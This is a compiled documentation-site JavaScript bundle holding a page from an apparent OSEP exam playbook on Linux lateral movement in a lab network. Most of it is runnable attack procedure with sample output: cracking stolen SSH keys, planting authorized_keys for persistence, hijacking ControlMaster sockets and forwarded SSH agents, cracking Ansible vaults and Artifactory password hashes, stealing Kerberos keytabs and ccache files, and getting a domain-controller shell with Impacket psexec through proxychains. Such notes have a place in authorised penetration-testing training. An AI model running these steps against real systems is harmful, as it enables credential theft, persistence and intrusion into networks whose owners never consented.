"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[6430],{4945(e,n,s){s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"osep/Linux/Lateral Movement","title":"Lateral Movement","description":"Lateral Movement","source":"@site/docs/osep/Linux/Lateral Movement.md","sourceDirName":"osep/Linux","slug":"/osep/Linux/Lateral Movement","permalink":"/OSEP-Playbook/docs/osep/Linux/Lateral Movement","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Initial Access","permalink":"/OSEP-Playbook/docs/osep/Linux/Initial Access"},"next":{"title":"Payloads","permalink":"/OSEP-Playbook/docs/osep/Linux/Payloads"}}');var r=s(4848),t=s(8453);const a={},c=void 0,o={},l=[{value:"<strong>Lateral Movement</strong>",id:"lateral-movement",level:3},{value:"<strong>Configuration Files</strong>",id:"configuration-files",level:3},{value:"<strong>SSH</strong>",id:"ssh",level:3},{value:"<strong>SSH Keys</strong>",id:"ssh-keys",level:3},{value:"<strong>SSH Persistence</strong>",id:"ssh-persistence",level:3},{value:"<strong>SSH Hijacking with ControlMaster</strong>",id:"ssh-hijacking-with-controlmaster",level:3},{value:"<strong>SSH Agent Forwarding</strong>",id:"ssh-agent-forwarding",level:3},{value:"<strong>Ansible</strong>",id:"ansible",level:3},{value:"<strong>Artifactory (JFrog)</strong>",id:"artifactory-jfrog",level:3},{value:"<strong>Kerberos</strong>",id:"kerberos",level:3},{value:"<strong>Stealing Keytab Files</strong>",id:"stealing-keytab-files",level:3},{value:"<strong>Stealing and Using Cached Files</strong>",id:"stealing-and-using-cached-files",level:3},{value:"<strong>Using Impacket Suite with Kerberos</strong>",id:"using-impacket-suite-with-kerberos",level:3}];function d(e){const n={code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h3,{id:"lateral-movement",children:(0,r.jsx)(n.strong,{children:"Lateral Movement"})}),"\n",(0,r.jsx)(n.h3,{id:"configuration-files",children:(0,r.jsx)(n.strong,{children:"Configuration Files"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Check the dot hidden files"}),", usually we could find private keys for SSH keys or hardcoded credentials, or indications on how the system works, potential important folders or scripts and much more."]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:".bashrc"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:".bash_profile"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:".mysql_history"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:".ssh"})}),"\n",(0,r.jsx)(n.li,{children:"Any other relevant file you may find"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"ssh",children:(0,r.jsx)(n.strong,{children:"SSH"})}),"\n",(0,r.jsx)(n.h3,{id:"ssh-keys",children:(0,r.jsx)(n.strong,{children:"SSH Keys"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Find Private Keys"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"find /home/ -name \"id_rsa\"\n\n/home/offsec/.ssh/id_rsa\nfind: \u2018/home/linuxvictim/.ssh': Permission denied\n...\nfind: \u2018/home/ansibleadm/.gnupg': Permission denied\nfind: \u2018/home/ansibleadm/.local/share': Permission denied\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Download Private Keys"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Copy contents to local computer\ncat id_rsa\n\ncat known_hosts\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Cracking Private Keys Passphrase"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Extract the key\nssh2john [ID_RSA] > ssh.hash\nssh2john [USER_KEY] > [USER_KEY]_hash.txt\nssh2john svuser.key > svuser.hash\n\n# Crack it\nsudo john --wordlist=/usr/share/wordlists/rockyou.txt ./[USER_KEY]_hash.txt\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Use Private Keys to Connect"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ssh -i ./svuser.key svuser@[TARGET_SERVER]\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"ssh-persistence",children:(0,r.jsx)(n.strong,{children:"SSH Persistence"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Generate SSH Keypair"}),"\xa0If we accept the default values for the file path, it will create a pair of files in our\xa0",(0,r.jsx)(n.strong,{children:"~/.ssh/directory"}),". We will get\xa0",(0,r.jsx)(n.strong,{children:"id_rsa"}),"\xa0for the private key and\xa0",(0,r.jsx)(n.strong,{children:"id_rsa.pub"}),"\xa0for the public key. We can then\xa0",(0,r.jsx)(n.strong,{children:"cat"}),"\xa0the contents of\xa0",(0,r.jsx)(n.strong,{children:"id_rsa.pub"}),"\xa0and copy it to the clipboard."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# On your Kali\nssh-keygen\n\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/kali/.ssh/id_rsa):\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/kali/.ssh/id_rsa.\nYour public key has been saved in /home/kali/.ssh/id_rsa.pub.\nThe key fingerprint is:\nSHA256:VTLfYd2shCqYOTkpZqeHRrqxnKjyVViNgbmVMpKyEug root@kali\nThe key's randomart image is:\n+---[RSA 2048]----+\n|.  . o..  o ..oo.|\n|+ o = o+   =.o..+|\n|.+ . =o*. ...... |\n|oE  *oX ...   .  |\n|.  =.=.oS.       |\n|  o +..          |\n| o *..           |\n|o =.             |\n|+..              |\n+----[SHA256]-----+\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Insert Public Key"}),"\xa0in the victim's user folder"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# For example if our target is /home/emma/\necho "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/emma/.ssh/authorized_keys\n\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Connect to the Victim"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ssh emma@[TARGET_SERVER]\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"ssh-hijacking-with-controlmaster",children:(0,r.jsx)(n.strong,{children:"SSH Hijacking with ControlMaster"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Theory"}),"\xa0SSH hijacking is a lateral movement technique that abuses existing SSH sessions, similar to RDP hijacking in Windows. Attackers often leverage the\xa0",(0,r.jsx)(n.strong,{children:"ControlMaster"}),"\xa0feature or the\xa0",(0,r.jsx)(n.strong,{children:"ssh-agent"}),"\xa0to reuse active connections without re-entering credentials. By creating or modifying a user's\xa0",(0,r.jsx)(n.code,{children:"~/.ssh/config"}),"\xa0file, ControlMaster can be enabled so that multiple sessions share the same socket, which remains open for a set time (",(0,r.jsx)(n.code,{children:"ControlPersist"}),") or indefinitely. If an attacker gains shell access or write permissions to a user's home directory, they can hijack active SSH connections to pivot into downstream systems. This is especially useful in red team scenarios where stealth and avoiding credential theft are priorities."]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Steps"}),"\xa0A --\x3e B: a has a session on B, piggybacking A's access to B"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Check files\n~/.ssh/config\nor\n/etc/ssh/ssh_config\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Any socket file like\xa0",(0,r.jsx)(n.code,{children:"kevin@web03:22"}),"\xa0in\xa0",(0,r.jsx)(n.code,{children:"/home/kevin/.ssh/controlmaster"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ssh kevin@web03\n\n# Example\nssh -S /home/user/.ssh/controlmaster/user\\@linuxvictim\\:22 user@linuxvictim\n\n"})}),"\n",(0,r.jsx)(n.p,{children:"If logged in as root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ssh -S /home/alice/.ssh/controlmaster\\@alice@web03\\:22 alice@web03\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"ssh-agent-forwarding",children:(0,r.jsx)(n.strong,{children:"SSH Agent Forwarding"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Theory"}),"\xa0SSH-Agent stores a user's private keys and answers signing requests so the user doesn't retype passphrases. Agent forwarding lets an intermediate host proxy those signing requests back to the origin client, enabling the forwarded session to SSH onward without the private key ever leaving the client. In an attack, an adversary on the intermediate machine can use the forwarded agent (or coerce it via crafted requests) to authenticate to downstream systems if the attacker can reach them \u2014 making agent-forwarding a powerful lateral-movement vector. Practical requirements: a keypair on the originating machine and the public key installed on the intermediate and destination hosts (e.g.,\xa0",(0,r.jsx)(n.code,{children:"ssh-copy-id -i ~/.ssh/id_rsa.pub user@host"}),")."]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Steps"}),"\xa0A -> B -> C: A has a session on B, and A's private key can access to both B and C. On B to access C. Normal user."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ssh alice@web03\n\n"})}),"\n",(0,r.jsx)(n.p,{children:"Privileged User"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"SSH_AUTH_SOCK=/tmp/ssh-xxx ssh-add -l\n\nSSH_AUTH_SOCK=/tmp/ssh-xxx ssh alice@web03\n\n# Example\nSSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh user@linuxvictim\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"ansible",children:(0,r.jsx)(n.strong,{children:"Ansible"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Playbook Possibilities"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Node hosts:\xa0",(0,r.jsx)(n.code,{children:"/etc/ansible/hosts"})]}),"\n",(0,r.jsxs)(n.li,{children:["Check the folder\xa0",(0,r.jsx)(n.code,{children:"/etc/ansible"})]}),"\n",(0,r.jsx)(n.li,{children:"Execute commands on node servers"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Crack Vaults"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Find a way to download the vault.\n\n# Convert the hash, for example\nansible2john root.enc > vault.hash\n\n# Crack the vault\njohn --wordlist=rockyou.txt vault.hash\n\n# Go back to the server and use the password to decrypt the vault\ncat the_vault | ansible-vault decrypt\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Retrieve credentials of node servers from playbook"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ansible2john web.yaml > ansible_web_hash.txt\n\nhashcat --wordlist=/usr/share/wordlists/rockyou.txt --force --hash-type=16900 ansible_web_hash.txt\n\ncat pw.txt | ansible-vault decrypt\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Sensitive data"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Playbook contains a command, the command contains plaintext credential, like\xa0",(0,r.jsx)(n.code,{children:"/opt/playbooks/mysql.yml"})]}),"\n",(0,r.jsxs)(n.li,{children:["Check the folder\xa0",(0,r.jsx)(n.code,{children:"/opt/playbooks/"}),"\xa0and\xa0",(0,r.jsx)(n.code,{children:"/var/log/syslog"}),"\xa0trying to find sensible information."]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"artifactory-jfrog",children:(0,r.jsx)(n.strong,{children:"Artifactory (JFrog)"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Check Location"}),"\xa0Binary Repository Manager - Port 8082"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ps aux | grep artifactory\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Possible Attacks"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Check existing files and user interactions"}),"\xa0like creation, download, etc."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Delivery malicious file"}),"\xa0(With user interaction)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Database backup contains credential"}),":\xa0",(0,r.jsx)(n.code,{children:"/opt/jfrog/artifactory/var/backup/access"}),", for example:"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Check the files found\ncd /opt/jfrog/artifactory/var/backup/access\ncat access.backup.20200730120454.json\n...\n{\n    "username" : "developer",\n    "firstName" : null,\n    "lastName" : null,\n    "email" : "developer@corp.local",\n    "realm" : "internal",\n    "status" : "enabled",\n    "lastLoginTime" : 0,\n    "lastLoginIp" : null,\n    "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",\n    "allowedIps" : [ "*" ],\n    "created" : 1591715957889,\n    "modified" : 1591715957889,\n    "failedLoginAttempts" : 0,\n    "statusLastModified" : 1591715957889,\n    "passwordLastModified" : 1591715957889,\n    "customData" : {\n      "updatable_profile" : {\n        "value" : "true",\n        "sensitive" : false\n      }\n...\n\n# Copy the bcrypt hash part to a file and try to crack it\necho "$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm" > derbyhash.txt\nsudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n'})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Compromise the Database"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# 1. Copy the database\nmkdir /tmp/hackeddb\nsudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb\nsudo chmod 755 /tmp/hackeddb/derby\nsudo rm /tmp/hackeddb/derby/*.lck\n\n# 2. Run the Derby connection utility\nsudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij\nij version 10.15\nij> connect 'jdbc:derby:/tmp/hackeddb/derby';\nij>\n\n# 3. Run your actions, like listing users\nij> select * from access_users;\nUSER_ID |USERNAME |PASSWORD |ALLOWED_IPS |CREATED |MODIFIED |FIRSTNAME |LASTNAME |EMAIL |REALM |STATUS |LAST_LOGIN_TIME |LAST_LOGIN_IP |FAILED_ATTEMPTS |STATUS_LAST_MODIFIED| PASSWORD_LAST_MODIF&\n...\n1 |admin |bcrypt$$2a$08$3gNs9Gm4wqY5ic/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2 |127.0.0.1 |1591715727140 |1591715811546 |NULL |NULL |NULL |internal |enabled |1596125074382 |192.168.118.5 |0 |1591715811545 |1591715811545\n...\n3 |developer |bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm |* |1591715957889 |1591715957889 |NULL |NULL |developer@corp.local |internal |enabled |0 |NULL |0 |1591715957889 |1591715957889\n\n3 rows selected\nij>\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"kerberos",children:(0,r.jsx)(n.strong,{children:"Kerberos"})}),"\n",(0,r.jsx)(n.h3,{id:"stealing-keytab-files",children:(0,r.jsx)(n.strong,{children:"Stealing Keytab Files"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Theory"}),"\xa0If we have access to an user and its password, we can create tickets for it and then use that ticket to connect to AD services or servers. Keytab files store a Kerberos principal name and encrypted keys, allowing scripts or users to authenticate to Kerberos-enabled resources without needing to enter a password. They're often used in automated tasks, such as cron jobs, to enable secure access to services like MSSQL. By reviewing cron configurations and scripts, one can identify which keytabs are in use and which users they belong to. A keytab can be created with\xa0",(0,r.jsx)(n.strong,{children:"ktutil"}),"\xa0by adding entries for a user, specifying encryption, entering the password, writing the keytab file, and exiting the utility."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Create the keytab file"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ktutil\n\nktutil:  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac\nPassword for administrator@CORP1.COM:\n\nktutil:  wkt /tmp/administrator.keytab\n\nktutil:  quit\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Load the keytab file"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab\n\n# Check and view that it was created successfully\nklist\n\nTicket cache: FILE:/tmp/krb5cc_1000\nDefault principal: administrator@CORP1.COM\n\nValid starting       Expires              Service principal\n07/30/2020 15:18:34  07/31/2020 01:18:34  krbtgt/CORP1.COM@CORP1.COM\n        renew until 08/06/2020 15:18:34\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"(Optional) Renewing an expired TGT"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"kinit -R\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Use the ticket, below is just an example accessing an smb with the ticket and no password but it can be any other server or service"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'smbclient -k -U "CORP1.COM\\administrator" //DC01.CORP1.COM/C$\n\n'})}),"\n",(0,r.jsx)(n.h3,{id:"stealing-and-using-cached-files",children:(0,r.jsx)(n.strong,{children:"Stealing and Using Cached Files"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Theory"}),"\xa0If you control a target's Kerberos session you can immediately act as that user by reusing their live tickets, avoiding the need for a fresh TGT; alternatively, stealing or copying a user's credential cache (ccache, typically\xa0",(0,r.jsx)(n.code,{children:"/tmp/krb5cc*"}),") and loading it locally lets you authenticate as them without their password \u2014 however, ccache files are usually owner-only readable so this typically requires privileged access (sudo/root or read access to the user's files). In short: live shells \u2192 use existing tickets; privileged access \u2192 copy\xa0",(0,r.jsx)(n.code,{children:"/tmp/krb5cc<\u2026>"}),"\xa0and import it to impersonate the user."]}),"\n",(0,r.jsx)(n.p,{children:"Two main attack scenarios for using a victim's Kerberos tickets:"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Compromise an active shell session"}),": If you control a user's' live shell, you can use their existing Kerberos tickets (no new TGT needed) and act as that user."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Steal or reuse the user's ccache file"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Kerberos credential caches (ccache) are usually stored under\xa0",(0,r.jsx)(n.code,{children:"/tmp"}),"\xa0(e.g.\xa0",(0,r.jsx)(n.code,{children:"/tmp/krb5cc<random>"}),")."]}),"\n",(0,r.jsx)(n.li,{children:"They're normally only readable by the owner, so an unprivileged attacker usually can't steal them."}),"\n",(0,r.jsx)(n.li,{children:"With privileged access (or the ability to read the user's files) you can copy the victim's ccache and load it as your own to authenticate without logging in as that user."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsxs)(n.strong,{children:["List ccache files in\xa0",(0,r.jsx)(n.code,{children:"/tmp/"})]})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"ls -al /tmp/krb5cc_*\n\n-rw------- 1 user                  user                 1430 Aug 25 15:17 /tmp/krb5cc_1000\n-rw------- 1 administrator@corp1.com domain users@corp1.com 4016 Aug 25 15:11 /tmp/krb5cc_607000500_3aeIA5\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Copy the ccache file"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"offsec@linuxvictim:~$ sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow\n[sudo] password for offsec:\n\noffsec@linuxvictim:~$ sudo chown offsec:offsec /tmp/krb5cc_minenow\n\noffsec@linuxvictim:~$ ls -al /tmp/krb5cc_minenow\n-rw------- 1 offsec offsec 4016 Jul 30 15:20 /tmp/krb5cc_minenow\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Setting the ccache file for using it and verifying"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Cleaning memory of current tickets\noffsec@linuxvictim:~$ kdestroy\n\noffsec@linuxvictim:~$ klist\nklist: No credentials cache found (filename: /tmp/krb5cc_1000)\n\n# Adding the ticket to memory\noffsec@linuxvictim:~$ export KRB5CCNAME=/tmp/krb5cc_minenow\n\noffsec@linuxvictim:~$ klist\n\nTicket cache: FILE:/tmp/krb5cc_minenow\nDefault principal: Administrator@CORP1.COM\n\nValid starting       Expires              Service principal\n07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM\n        renew until 08/06/2020 15:11:08\n07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM\n        renew until 08/06/2020 15:11:08\n07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM\n        renew until 08/06/2020 15:11:08\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Use the ticket, below is just an example for getting service tickets using our current stolen ticket"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Requesting the TGTs for services\noffsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433\n\nMSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2\n\n# Verifying the new added tickets from Kerberos\noffsec@linuxvictim:~$ klist\nTicket cache: FILE:/tmp/krb5cc_minenow\nDefault principal: Administrator@CORP1.COM\n\nValid starting       Expires              Service principal\n07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM\n        renew until 08/06/2020 15:11:08\n07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM\n        renew until 08/06/2020 15:11:08\n07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM\n        renew until 08/06/2020 15:11:08\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"using-impacket-suite-with-kerberos",children:(0,r.jsx)(n.strong,{children:"Using Impacket Suite with Kerberos"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Download the ccache file and set up the KRB5CCNAME environment variable"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"kali@kali:~$ scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow\noffsec@linuxvictim's password:\nkrb5cc_minenow                            100% 4016    43.6KB/s   00:00\n\nkali@kali:~$ export KRB5CCNAME=/tmp/krb5cc_minenow\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Install Kerberos client utilities"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"sudo apt install krb5-user\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsxs)(n.strong,{children:["Add the DC IP to the\xa0",(0,r.jsx)(n.code,{children:"/etc/hosts"}),"\xa0file"]}),", like in the example below"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"127.0.0.1\tlocalhost\n192.168.120.40  controller\n192.168.120.45  linuxvictim\n192.168.120.5 CORP1.COM DC01.CORP1.COM\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsxs)(n.strong,{children:["Commented out\xa0",(0,r.jsx)(n.code,{children:"proxy_dns"}),"\xa0line in proxychains configuration file\xa0",(0,r.jsx)(n.code,{children:"/etc/proxychains.conf"})]})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"# proxychains.conf  VER 3.1\n#\n#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.\n#\n...\n# Proxy DNS requests - no leak for DNS data\n#proxy_dns\n...\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["(Optional) Setup an SSH tunnel for\xa0",(0,r.jsx)(n.code,{children:"proxychains"}),"\xa0to be able to reach the internal network, discard this step if you had configured the internal tunneling otherwise, for this code example below in the\xa0",(0,r.jsx)(n.code,{children:"/etc/proxychains.conf"}),"\xa0should be the line\xa0",(0,r.jsx)(n.code,{children:"socks 127.0.0.1 9050"})]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"kali@kali:~$ ssh [USER]@linuxvictim -D 9050\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)\n...\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Run the tools"}),", below is just an example"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Listing Active Directory users\nproxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip [DC_IP] [DOMAIN].COM/Administrator\n\n# Gather SPNs for our Kerberos user\nproxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip [DC_IP] [DOMAIN].COM/Administrator\n\n# Getting a shell with psexec\nproxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453(e,n,s){s.d(n,{R:()=>a,x:()=>c});var i=s(6540);const r={},t=i.createContext(r);function a(e){const n=i.useContext(t);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);